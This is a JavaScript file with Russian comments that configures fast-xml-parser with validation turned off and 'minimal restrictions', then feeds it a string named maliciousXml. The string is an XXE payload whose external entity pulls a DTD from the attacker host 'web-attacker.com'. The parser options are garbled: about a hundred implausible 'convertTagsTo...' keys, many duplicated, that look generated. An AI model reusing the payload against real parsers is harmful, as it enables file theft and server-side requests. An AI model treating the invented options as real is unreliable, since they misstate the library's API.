const { XMLParser } = require('fast-xml-parser');

// Создаем парсер с минимальными ограничениями
const parser = new XMLParser({
  transformNodeName: (name) => name.replace(/^xmlns:/, ''),
  transformValue: (value) => value.replace(/^(?:xmlns|xmlns:)?[^=]+=/, '').trim(),
  ignoreAttributes: false,
  allowBooleanAttributes: true,
  trimValues: true,
  cdataBinding: true,
  parseTrueNumberOnly: false,
  arrayMode: false,
  transformation: [],
  customHandlers: {},
  stopNodes: ['parseMe'],
  validate: false, // Отключаем валидацию
  charKeyHandler: undefined,
  randomizeKeys: undefined,
  silenceExceptions: false,
  jsonSpace: '',
  mergeAttrs: true,
  preserveOrder: false,
  parseArrayOfArrays: false,
  arrayItemStyle: 'array',
  arrayItemDelimiter: ',',
  convertEnumKeysToObject: false,
  convertEnumKeysToArray: false,
  convertTagsToCamelCase: false,
  convertTagsToLowerCase: false,
  convertTagsToUpperCase: false,
  convertTagsToTitleCase: false,
  convertTagsToSnakeCase: false,
  convertTagsToKebabCase: false,
  convertTagsToConstantCase: false,
  convertTagsToPascalCase: false,
  convertTagsToDotNotation: false,
  convertTagsToObject: false,
  convertTagsToString: false,
  convertTagsToMap: false,
  convertTagsToList: false,
  convertTagsToSet: false,
  convertTagsToTuple: false,
  convertTagsToUnion: false,
  convertTagsToIntersection: false,
  convertTagsToEnum: false,
  convertTagsToClass: false,
  convertTagsToInterface: false,
  convertTagsToTypeAlias: false,
  convertTagsToFunction: false,
  convertTagsToVariable: false,
  convertTagsToProperty: false,
  convertTagsToMethod: false,
  convertTagsToEvent: false,
  convertTagsToEnumMember: false,
  convertTagsToModule: false,
  convertTagsToNamespace: false,
  convertTagsToClassField: false,
  convertTagsToClassMethod: false,
  convertTagsToClassProperty: false,
  convertTagsToClassStaticField: false,
  convertTagsToClassStaticMethod: false,
  convertTagsToClassStaticProperty: false,
  convertTagsToEnumMember: false,
  convertTagsToEnumConstructor: false,
  convertTagsToInterfaceIndexSignature: false,
  convertTagsToInterfaceMethod: false,
  convertTagsToInterfaceProperty: false,
  convertTagsToInterfaceStaticMethod: false,
  convertTagsToInterfaceStaticProperty: false,
  convertTagsToModuleAugmentation: false,
  convertTagsToNamespaceAlias: false,
  convertTagsToNamespaceImport: false,
  convertTagsToNamespaceExport: false,
  convertTagsToNamespaceReexport: false,
  convertTagsToParameter: false,
  convertTagsToReturn: false,
  convertTagsToFunctionParameter: false,
  convertTagsToFunctionReturn: false,
  convertTagsToVariableDeclaration: false,
  convertTagsToVariableAssignment: false,
  convertTagsToClassPropertyDecorator: false,
  convertTagsToClassMethodDecorator: false,
  convertTagsToClassAccessorDecorator: false,
  convertTagsToEnumMemberDecorator: false,
  convertTagsToInterfaceMethodDecorator: false,
  convertTagsToInterfaceAccessorDecorator: false,
  convertTagsToTypeDecorator: false,
  convertTagsToModuleAugmentationDecorator: false,
  convertTagsToParameterDecorator: false,
  convertTagsToReturnDecorator: false,
  convertTagsToVariableDecorator: false,
  convertTagsToClassStaticPropertyDecorator: false,
  convertTagsToClassStaticMethodDecorator: false,
  convertTagsToClassStaticAccessorDecorator: false,
  convertTagsToEnumMemberDecorator: false,
  convertTagsToInterfaceStaticMethodDecorator: false,
  convertTagsToInterfaceStaticAccessorDecorator: false,
  convertTagsToTypeDecoder: false,
  convertTagsToModuleAugmentationDecoder: false,
  convertTagsToParameterDecoder: false,
  convertTagsToReturnDecoder: false,
  convertTagsToVariableDecoder: false,
  convertTagsToClassStaticPropertyDecoder: false,
  convertTagsToClassStaticMethodDecoder: false,
  convertTagsToClassStaticAccessorDecoder: false,
  convertTagsToEnumMemberDecoder: false,
  convertTagsToInterfaceStaticMethodDecoder: false,
  convertTagsToInterfaceStaticAccessorDecoder: false,
  convertTagsToTypeDecoder: false,
  convertTagsToModuleAugmentationDecoder: false,
  convertTagsToParameterDecoder: false,
  convertTagsToReturnDecoder: false,
  convertTagsToVariableDecoder: false,
});

// Функция для парсинга XML
function parseXml(xmlString) {
  try {
    return parser.parse(xmlString);
  } catch (error) {
    console.error('Ошибка при парсинге XML:', error);
    return null;
  }
}

// Пример использования
const maliciousXml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
`;

const result = parseXml(maliciousXml);

if (result) {
  console.log('Результат парсинга:');
  console.log(JSON.stringify(result, null, 2));
} else {
  console.log('Не удалось выполнить парсинг.');
}
